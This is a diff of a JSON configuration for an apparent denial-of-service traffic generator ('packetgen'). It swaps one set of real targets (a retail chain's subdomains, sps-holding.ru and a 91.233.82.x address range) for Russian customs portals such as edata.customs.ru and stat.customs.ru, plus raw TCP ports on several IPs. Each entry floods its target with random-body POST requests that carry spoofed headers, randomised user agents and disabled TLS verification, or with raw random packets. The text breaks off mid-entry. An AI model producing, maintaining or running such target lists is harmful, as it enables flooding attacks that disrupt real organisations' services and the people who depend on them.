@@ -8,40 +8,21 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.24",
+            "count": 3,
+            "name": "tcp://95.167.108.106:5800",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.24:80"
+                        "address": "95.167.108.106:5800"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.24",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.24",
-                                "Referer": "http://91.233.82.24",
-                                "X-Forwarded-Host": "91.233.82.24",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -49,14 +30,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://portal.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "https://web4.edata.customs.ru/FtsPersonalCabinetWeb2017/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "portal.krasnoe-beloe.ru:443",
+                        "address": "web4.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -67,7 +48,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://portal.krasnoe-beloe.ru",
+                            "path": "https://web4.edata.customs.ru/FtsPersonalCabinetWeb2017/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -80,9 +61,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://portal.krasnoe-beloe.ru",
-                                "Referer": "https://portal.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "portal.krasnoe-beloe.ru",
+                                "Origin": "https://web4.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://web4.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "web4.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -93,14 +74,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://84.201.167.117:22",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49152",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "84.201.167.117:22"
+                        "address": "95.167.108.106:49152"
                     }
                 },
                 "packet": {
@@ -115,14 +96,77 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://lyncdiscover.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "http://webinar.customs.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "lyncdiscover.krasnoe-beloe.ru:443",
+                        "address": "webinar.customs.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://webinar.customs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://webinar.customs.ru",
+                                "Referer": "http://webinar.customs.ru",
+                                "X-Forwarded-Host": "webinar.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.39:4445",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.39:4445"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://edata.customs.ru/FtsPersonalCabinetWeb2017/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -133,7 +177,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://lyncdiscover.krasnoe-beloe.ru",
+                            "path": "https://edata.customs.ru/FtsPersonalCabinetWeb2017/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -146,9 +190,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://lyncdiscover.krasnoe-beloe.ru",
-                                "Referer": "https://lyncdiscover.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "lyncdiscover.krasnoe-beloe.ru",
+                                "Origin": "https://edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -159,80 +203,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.1:993",
+            "count": 3,
+            "name": "http://stat.customs.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.1:993"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.1:110",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.1:110"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.24:3306",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.24:3306"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.15",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.15:80"
+                        "address": "stat.customs.ru:80"
                     }
                 },
                 "packet": {
@@ -240,7 +218,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://91.233.82.15",
+                            "path": "http://stat.customs.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -253,9 +231,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.15",
-                                "Referer": "http://91.233.82.15",
-                                "X-Forwarded-Host": "91.233.82.15",
+                                "Origin": "http://stat.customs.ru",
+                                "Referer": "http://stat.customs.ru",
+                                "X-Forwarded-Host": "stat.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -266,14 +244,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.1:143",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49159",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.1:143"
+                        "address": "92.124.222.26:49159"
                     }
                 },
                 "packet": {
@@ -288,40 +266,21 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://arenda.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49155",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "arenda.krasnoe-beloe.ru:80"
+                        "address": "92.124.222.26:49155"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://arenda.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://arenda.krasnoe-beloe.ru",
-                                "Referer": "http://arenda.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "arenda.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -329,14 +288,36 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://91.233.82.6",
+            "count": 3,
+            "name": "tcp://92.124.222.26:445",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.6:443",
+                        "address": "92.124.222.26:445"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web2.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web2.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -347,7 +328,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.233.82.6",
+                            "path": "https://web2.edata.customs.ru/FtsPersonalCabinetWeb2017/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -360,9 +341,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.233.82.6",
-                                "Referer": "https://91.233.82.6",
-                                "X-Forwarded-Host": "91.233.82.6",
+                                "Origin": "https://web2.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://web2.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "web2.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -373,55 +354,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://access.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "https://web1.edata.customs.ru/FtsPersonalCabinetWeb2017/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "access.krasnoe-beloe.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://access.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://access.krasnoe-beloe.ru",
-                                "Referer": "http://access.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "access.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "https://91.233.82.11",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.11:443",
+                        "address": "web1.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -432,7 +372,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.233.82.11",
+                            "path": "https://web1.edata.customs.ru/FtsPersonalCabinetWeb2017/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -445,9 +385,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.233.82.11",
-                                "Referer": "https://91.233.82.11",
-                                "X-Forwarded-Host": "91.233.82.11",
+                                "Origin": "https://web1.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://web1.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "web1.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -458,14 +398,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.83:22",
+            "count": 3,
+            "name": "tcp://95.167.108.106:135",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.83:22"
+                        "address": "95.167.108.106:135"
                     }
                 },
                 "packet": {
@@ -480,14 +420,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.4:81",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49153",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.4:81"
+                        "address": "95.167.108.106:49153"
                     }
                 },
                 "packet": {
@@ -502,140 +442,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.84:22",
+            "count": 3,
+            "name": "https://web1.edata.customs.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.84:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.9",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.9:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.9",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.9",
-                                "Referer": "http://91.233.82.9",
-                                "X-Forwarded-Host": "91.233.82.9",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://mail.krasnoe-beloe.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "mail.krasnoe-beloe.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://mail.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://mail.krasnoe-beloe.ru",
-                                "Referer": "http://mail.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "mail.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.1:995",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.1:995"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "https://ns.sps-holding.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ns.sps-holding.ru:443",
+                        "address": "web1.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -646,7 +460,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ns.sps-holding.ru",
+                            "path": "https://web1.edata.customs.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -659,9 +473,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ns.sps-holding.ru",
-                                "Referer": "https://ns.sps-holding.ru",
-                                "X-Forwarded-Host": "ns.sps-holding.ru",
+                                "Origin": "https://web1.edata.customs.ru",
+                                "Referer": "https://web1.edata.customs.ru",
+                                "X-Forwarded-Host": "web1.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -672,14 +486,36 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://pop.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "tcp://95.163.65.62:445",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "pop.krasnoe-beloe.ru:443",
+                        "address": "95.163.65.62:445"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web03.edata.customs.ru/FtsDataSetWeb/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web03.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -690,7 +526,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://pop.krasnoe-beloe.ru",
+                            "path": "https://web03.edata.customs.ru/FtsDataSetWeb/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -703,9 +539,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://pop.krasnoe-beloe.ru",
-                                "Referer": "https://pop.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "pop.krasnoe-beloe.ru",
+                                "Origin": "https://web03.edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://web03.edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "web03.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -716,55 +552,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://vpn.sps-holding.ru",
+            "count": 3,
+            "name": "https://web2.edata.customs.ru/FtsDataSetWeb/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "vpn.sps-holding.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://vpn.sps-holding.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://vpn.sps-holding.ru",
-                                "Referer": "http://vpn.sps-holding.ru",
-                                "X-Forwarded-Host": "vpn.sps-holding.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "https://91.233.82.24",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.24:443",
+                        "address": "web2.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -775,7 +570,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.233.82.24",
+                            "path": "https://web2.edata.customs.ru/FtsDataSetWeb/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -788,9 +583,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.233.82.24",
-                                "Referer": "https://91.233.82.24",
-                                "X-Forwarded-Host": "91.233.82.24",
+                                "Origin": "https://web2.edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://web2.edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "web2.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -801,370 +596,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.3:993",
+            "count": 3,
+            "name": "https://vks.customs.gov.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.3:993"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.1:21",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.1:21"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.11",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.11:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.11",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.11",
-                                "Referer": "http://91.233.82.11",
-                                "X-Forwarded-Host": "91.233.82.11",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.26",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.26:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.26",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.26",
-                                "Referer": "http://91.233.82.26",
-                                "X-Forwarded-Host": "91.233.82.26",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.3:995",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.3:995"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.13:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.13:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://94.26.226.71:9100",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "94.26.226.71:9100"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.249",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.249:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.249",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.249",
-                                "Referer": "http://91.233.82.249",
-                                "X-Forwarded-Host": "91.233.82.249",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://1rus.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "1rus.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://1rus.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
